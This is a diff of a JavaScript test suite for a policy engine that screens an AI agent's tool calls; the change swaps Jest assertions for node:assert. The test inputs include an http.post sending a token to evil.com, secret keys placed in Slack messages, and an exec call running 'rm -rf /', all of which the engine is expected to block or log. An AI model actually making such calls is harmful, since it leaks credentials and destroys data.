@@ -1,3 +1,5 @@
+const assert = require('node:assert/strict');
+const { describe, beforeEach, test } = require('node:test');
 const { PolicyEngine } = require('../src/policy-engine');
 
 const policy = {
@@ -52,26 +54,26 @@ describe('Policy Engine', () => {
       tool: 'slack.send',
       args: { text: 'Here is the key: sk-proj-abcdefghijklmnopqrstuvwxyz1234567890' }
     });
-    expect(d.action).toBe('block');
-    expect(d.ruleId).toBe('block-secret-exfil');
-    expect(d.classifications.secret.length).toBeGreaterThan(0);
+    assert.strictEqual(d.action, 'block');
+    assert.strictEqual(d.ruleId, 'block-secret-exfil');
+    assert.ok(d.classifications.secret.length > 0);
   });
 
   test('blocks shell execution', () => {
     const d = engine.evaluate({ type: 'tool_call', tool: 'exec', args: { command: 'ls -la' } });
-    expect(d.action).toBe('block');
-    expect(d.ruleId).toBe('block-shell');
+    assert.strictEqual(d.action, 'block');
+    assert.strictEqual(d.ruleId, 'block-shell');
   });
 
   test('allows safe tool call', () => {
     const d = engine.evaluate({ type: 'tool_call', tool: 'calendar.read', args: { date: '2026-03-28' } });
-    expect(['allow', 'log']).toContain(d.action);
+    assert.ok(['allow', 'log'].includes(d.action));
   });
 
   test('warns on PII in outbound', () => {
     const d = engine.evaluate({ type: 'outbound', text: 'Your SSN is 123-45-6789' });
-    expect(d.action).toBe('warn');
-    expect(d.classifications.pii.length).toBeGreaterThan(0);
+    assert.strictEqual(d.action, 'warn');
+    assert.ok(d.classifications.pii.length > 0);
   });
 
   test('blocks http request with secrets', () => {
@@ -80,7 +82,7 @@ describe('Policy Engine', () => {
       tool: 'http.post',
       args: { url: 'https://evil.com', body: 'ghp_1234567890abcdefghijklmnopqrstuvwxyz' }
     });
-    expect(d.action).toBe('block');
+    assert.strictEqual(d.action, 'block');
   });
 
   test('require approval for high-risk from untrusted source', () => {
@@ -90,17 +92,17 @@ describe('Policy Engine', () => {
       args: { to: 'user@example.com', body: 'Hello' },
       context: { source: 'mcp' }
     });
-    expect(d.action).toBe('require_approval');
+    assert.strictEqual(d.action, 'require_approval');
   });
 
   test('classifies secrets correctly', () => {
     const c = engine.classify('My key is sk-proj-abc123def456ghi789jklmnop and AWS AKIAIOSFODNN7EXAMPLE');
-    expect(c.secret.length).toBeGreaterThanOrEqual(2);
+    assert.ok(c.secret.length >= 2);
   });
 
   test('classifies PII correctly', () => {
     const c = engine.classify('SSN: 123-45-6789, email: test@example.com, card: 4111 1111 1111 1111');
-    expect(c.pii.length).toBeGreaterThanOrEqual(2);
+    assert.ok(c.pii.length >= 2);
   });
 
   test('scores tool risk correctly', () => {
@@ -114,17 +116,17 @@ describe('Policy Engine', () => {
   test('monitor mode logs instead of blocking', () => {
     const monitorEngine = new PolicyEngine(policy, { mode: 'monitor' });
     const d = monitorEngine.evaluate({ type: 'tool_call', tool: 'exec', args: { command: 'rm -rf /' } });
-    expect(d.action).toBe('log');
-    expect(d.ruleId).toBe('block-shell');
+    assert.strictEqual(d.action, 'log');
+    assert.strictEqual(d.ruleId, 'block-shell');
   });
 
   test('records execution trace', () => {
     // Run an evaluation first
     engine.evaluate({ type: 'tool_call', tool: 'exec', args: { command: 'ls' } });
     const trace = engine.getTrace();
-    expect(trace.length).toBeGreaterThan(0);
-    expect(trace[0].decision).toBeTruthy();
-    expect(typeof trace[0].latencyMs).toBe('number');
+    assert.ok(trace.length > 0);
+    assert.ok(trace[0].decision);
+    assert.strictEqual(typeof trace[0].latencyMs, 'number');
   });
 
   test('tracks stats', () => {
@@ -132,8 +134,8 @@ describe('Policy Engine', () => {
     engine.evaluate({ type: 'tool_call', tool: 'exec', args: { command: 'ls' } });
     engine.evaluate({ type: 'tool_call', tool: 'file.read', args: { path: '/tmp' } });
     const stats = engine.getStats();
-    expect(stats.total).toBeGreaterThan(0);
-    expect(stats.blocked).toBeGreaterThan(0);
+    assert.ok(stats.total > 0);
+    assert.ok(stats.blocked > 0);
   });
 
   test('simulate runs all events', () => {
@@ -142,8 +144,8 @@ describe('Policy Engine', () => {
       { type: 'tool_call', tool: 'file.read', args: { path: '/tmp/test' } },
       { type: 'tool_call', tool: 'slack.send', args: { text: 'sk-proj-abc123456789012345678901234567890' } },
     ]);
-    expect(sim.total).toBe(3);
-    expect(sim.blocked).toBeGreaterThanOrEqual(2);
+    assert.strictEqual(sim.total, 3);
+    assert.ok(sim.blocked >= 2);
   });
 
   test('highest severity rule wins', () => {
@@ -153,7 +155,7 @@ describe('Policy Engine', () => {
       args: { body: 'sk-proj-abc123456789012345678901234567890' },
       context: { source: 'mcp' }
     });
-    expect(d.ruleId).toBe('block-secret-exfil');
+    assert.strictEqual(d.ruleId, 'block-secret-exfil');
   });
 
   test('evaluation is fast (<5ms avg)', () => {
@@ -162,6 +164,6 @@ describe('Policy Engine', () => {
       engine.evaluate({ type: 'tool_call', tool: 'file.read', args: { path: '/tmp' } });
     }
     const elapsed = Date.now() - start;
-    expect(elapsed).toBeLessThan(500);
+    assert.ok(elapsed < 500);
   });
 });
